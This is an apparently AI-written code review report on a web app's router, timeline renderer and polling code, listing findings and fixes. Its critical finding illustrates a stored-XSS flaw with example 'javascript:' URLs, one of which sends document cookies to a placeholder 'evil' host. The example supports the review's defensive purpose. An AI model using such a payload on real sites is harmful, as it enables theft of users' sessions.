---
phase: 04-hub-block-and-status-renderer
reviewed: 2026-05-28T00:00:00Z
depth: standard
files_reviewed: 3
files_reviewed_list:
  - docker/web/site/app.js
  - docker/web/site/index.html
  - docker/web/site/style-map.css
findings:
  critical: 1
  warning: 6
  info: 4
  total: 11
status: issues_found
---

# Phase 4: Code Review Report

**Reviewed:** 2026-05-28
**Depth:** standard
**Files Reviewed:** 3
**Status:** issues_found

## Summary

Reviewed the Phase 4 frontend SPA renderers (hub `#/map`, single-block `#/map/<slug>`,
status `#/status`) plus the visibility-aware 60s Evolution idle poll. The code is
careful about XSS — every DB-derived string flows through `escapeHtml()`, the two
`marked.parse()` sites are explicitly acknowledged as accepted residual risk (T-04-03-01,
gated by the Phase 9 publish approval control), and the convention bans (no template
literals, no RLS-redundant `.eq('status', ...)` filters on `economy_map`) are respected.

The escaping is sound. The defects cluster in the **router/poll lifecycle**, where the
hash-parsing and slug-prefix guards have correctness gaps that range from a confirmed
injection vector (the `data-source` attribute is the one DOM sink that escaping does NOT
fully neutralize for `javascript:`-style anchors — see CR-01) down to latent races that
the current 7-block seed happens to dodge.

The single Critical finding is a stored-XSS / unsafe-URL vector through `timeline_entries.source_url`,
which is rendered into both an `href` and a `data-source` attribute. The Warnings cover
the router's fragile `split('/')` slug extraction, an empty-slug route, a slug-prefix
poll race, a too-loose `#/map` prefix match, the exact-30 "Show all" false positive, and
a button-desync edge in the poll repaint.

## Critical Issues

### CR-01: `source_url` rendered into href without scheme validation — javascript:/data: URL injection

**File:** `docker/web/site/app.js:561` (and `:567` for the `data-source` attribute mirror)
**Issue:**
`renderTimelineEntries()` emits the DB-supplied `source_url` directly into an anchor `href`:

```js
line2Inner += '<a class="timeline-source" href="' + escapeHtml(e.source_url) + '" target="_blank" rel="noopener noreferrer">source ↗</a>';
```

`escapeHtml()` only HTML-entity-encodes `<`, `>`, `&`, `"` — it does **not** validate the
URL scheme. A `source_url` of `javascript:alert(document.cookie)` (or
`javascript:fetch('https://evil/?c='+document.cookie)`) survives escaping intact, because
none of those characters are escaped, and produces a clickable anchor that executes script
in the operator's session when clicked. `data:text/html,...` is similarly dangerous.

The comment block above the function asserts "what_shifted / why_it_mattered / source_url
all escaped" — this conflates HTML-entity escaping with URL-scheme safety. They are not the
same control. `target="_blank" rel="noopener"` does nothing to stop a `javascript:` URL.

While the Phase 9 publish gate covers `body_md` markdown (CR is body content, operator-approved),
`timeline_entries` rows are **not** part of that gate — they are inserted by the synthesis
pipeline / `/map-*` tooling and surfaced live via the 60s poll without an approval step. A
malicious or malformed `source_url` (e.g. from an upstream scraped source that flows into a
timeline entry) reaches the rendered DOM directly. This is the one sink where the "everything
is escaped" invariant does not hold.

**Fix:** Validate the scheme before emitting the anchor; render plain text (or drop the link)
for anything that is not http(s). Without template literals (convention):

```js
function safeHttpUrl(u) {
    if (typeof u !== 'string') return null;
    // Reject anything that is not an absolute http(s) URL.
    if (!/^https?:\/\//i.test(u.trim())) return null;
    return u;
}
// ...
var safeUrl = safeHttpUrl(e.source_url);
var hasSource = (safeUrl !== null);
// ...
if (hasSource) {
    line2Inner += '<a class="timeline-source" href="' + escapeHtml(safeUrl) +
        '" target="_blank" rel="noopener noreferrer">source ↗</a>';
}
// and gate the data-source attribute on the same safeUrl, not raw e.source_url
var open = hasSource
    ? '<article class="timeline-entry" data-source="' + escapeHtml(safeUrl) + '">'
    : '<article class="timeline-entry">';
```

Note the current `hasSource` test (`typeof e.source_url === 'string' && e.source_url.length > 0`)
also lets a whitespace-only or non-URL string through into both the `href` and `data-source`.

## Warnings

### WR-01: Router slug extraction includes the query string and any extra path segments

**File:** `docker/web/site/app.js:118` (`getRoute`)
**Issue:**
`return { view: 'block', slug: hash.split('/')[2] };` takes everything after `#/map/` up to
the next `/` as the slug, verbatim. For `#/map/governance?x=1` the slug becomes
`governance?x=1`; for `#/map/foo/bar` it silently drops `bar`. The slug is then used in
`.eq('slug', slug)` (line 450) and in the poll race-guard `startsWith('#/map/' + slug)`
(line 686). A query string or fragment appended to a map link (e.g. a shared URL with an
analytics param) breaks the DB lookup and the guard. It is also asymmetric with the tile
href, which is `encodeURIComponent(b.slug)` (line 403) — the route does NOT decode it, so any
slug that percent-encodes would also fail to match. Slugs are currently hyphen-only so this
is latent, but the parsing is fragile.

**Fix:** Strip query/extra segments and decode:

```js
if (hash.startsWith('#/map/')) {
    var rest = hash.slice('#/map/'.length).split('?')[0].split('/')[0];
    return { view: 'block', slug: decodeURIComponent(rest) };
}
```

### WR-02: Empty slug route (`#/map/`) silently hits the "Block not found" path

**File:** `docker/web/site/app.js:118, 437`
**Issue:**
`#/map/` (trailing slash, no slug) parses to `slug: ''` and calls `loadBlock('')`, which
queries `.eq('slug', '').single()`. `.single()` on zero rows returns an error, so the user
lands on "Block not found" rather than the hub. This is reachable by a user editing the URL
or a malformed link. It would be more correct to treat an empty slug as the hub.

**Fix:** In `getRoute`, fall through to the map view when the extracted slug is empty:

```js
if (hash.startsWith('#/map/')) {
    var slug = decodeURIComponent(hash.slice('#/map/'.length).split('?')[0].split('/')[0]);
    if (slug) return { view: 'block', slug: slug };
    return { view: 'map' };
}
```

### WR-03: Idle-poll slug guard uses a prefix match — vulnerable to slug-prefix collision

**File:** `docker/web/site/app.js:686` (`pollEvolution`)
**Issue:**
`if (!window.location.hash.startsWith('#/map/' + slug)) return;` is a **prefix** test, not an
exact-slug test. If two slugs ever share a prefix (e.g. a future `governance` and the existing
`governance-accountability`), a poll started for `governance` would keep firing on the
`governance-accountability` page and repaint that page's `#evolution-entries` with the wrong
block's timeline. The current 7-block seed has no prefix collisions, so this is latent — but
the guard's intent ("am I still on the page I started polling for?") is not what the code
checks. The same loose match is in the cleanup listener (line 756) and visibilitychange
listener (line 769), though those only check `#/map/` so are merely over-broad, not wrong.

**Fix:** Compare against the parsed route slug exactly instead of a string prefix:

```js
var r = getRoute();
if (r.view !== 'block' || r.slug !== slug) return;
```

### WR-04: `#/map` prefix match is too loose — `#/mapfoo` loads the hub

**File:** `docker/web/site/app.js:120` (`getRoute`)
**Issue:**
`if (hash.startsWith('#/map'))` matches `#/mapfoo`, `#/maps`, `#/map-anything`, routing them
to the hub instead of the list fallback. Minor (no security impact, no current links produce
these), but the route table accepts unintended hashes. The `#/status` check (line 123) has the
same looseness (`#/statusbar` → status view).

**Fix:** Anchor the match to a boundary:

```js
if (hash === '#/map' || hash.startsWith('#/map?')) {
    return { view: 'map' };
}
```
(or check `hash === '#/map'` plus the already-handled `#/map/` branch above it).

### WR-05: "Show all" button shown when a block has exactly 30 entries (false positive)

**File:** `docker/web/site/app.js:529-531` (render) and `:702` (poll repaint)
**Issue:**
The "Show all" affordance is gated on `entries.length === 30`, used as a proxy for "the cap was
hit, there may be more." When a block has *exactly* 30 timeline entries, the button appears but
`expandTimeline()` re-runs the unbounded query and renders the same 30 rows — the button then
removes itself with no visible change. Cosmetic, but it misrepresents that more data exists.

**Fix:** Query one extra row to disambiguate cap-hit from exact-30. Fetch `.limit(31)`, show the
button only when `data.length > 30`, and render `data.slice(0, 30)` in the collapsed view. Update
both the `loadBlock` query (line 451), the render gate (line 529), and the poll gate (line 702)
consistently.

### WR-06: Poll repaint never removes the "Show all" button when collapsed and entries fall to/under the cap

**File:** `docker/web/site/app.js:701-714` (`pollEvolution`)
**Issue:**
The poll's button-sync logic only *adds* a button (when collapsed, `data.length === 30`, and no
button exists) or *removes* it (when expanded). There is no branch that removes a stale button
when collapsed and `data.length < 30`. Today timeline entries are insert-only so the count never
shrinks, which is why this is a Warning rather than a bug with a live trigger — but the repaint
logic does not actually keep the button "in sync with the (possibly changed) result" as its
comment claims (line 698). If a row is ever deleted/filtered out, a dangling button persists.

**Fix:** Add the symmetric removal:

```js
if (!timelineExpanded && data.length < 30 && btn) {
    btn.remove();
}
```

## Info

### IN-01: `escapeHtml` comment overstates the guarantee for URLs

**File:** `docker/web/site/app.js:550-551, 564`
**Issue:** Comments state `source_url` is "escaped" and the source-null variant "omits the
data-source attribute entirely." HTML-entity escaping is not URL-scheme validation (see CR-01),
and the comment risks future maintainers trusting `escapeHtml` for `href` safety. Update the
comments once CR-01's scheme check lands so the invariant is documented accurately.

### IN-02: `route()` resets `window.currentNewsletter` but not `window.currentBlock` / list state

**File:** `docker/web/site/app.js:730`
**Issue:** `route()` nulls only `window.currentNewsletter` on every navigation. `window.currentBlock`,
`window.currentTimelineEntries`, and `window.currentStatusBlocks` persist across views. No current
bug (the visibilitychange guard also checks the hash), but the asymmetric cleanup is a latent
foot-gun if a future handler reads `window.currentBlock` without a hash re-check. Consider
clearing block state on non-block routes for consistency.

### IN-03: `formatDate` produces locale-dependent output used inside `<time>` without a `datetime` attribute

**File:** `docker/web/site/app.js:552, 327-332`
**Issue:** Timeline and status timestamps render `formatDate()` output (e.g. "May 15, 2026") inside
`<time>` elements with no machine-readable `datetime` attribute, and the value depends on the
viewer's locale. Accessibility/semantics nit, not a correctness bug. Consider
`<time datetime="<ISO>">`.

### IN-04: `loadEdition` parses edition number with `parseInt` and no NaN guard

**File:** `docker/web/site/app.js:127, 220`
**Issue:** `#/edition/abc` yields `parseInt('abc') === NaN`, which flows into `.eq('edition_number', NaN)`.
This is pre-existing (not Phase 4 code) and the `.single()` error path renders "Edition not found,"
so it degrades gracefully — noted only for completeness since it sits adjacent to the new routes.

---

_Reviewed: 2026-05-28_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
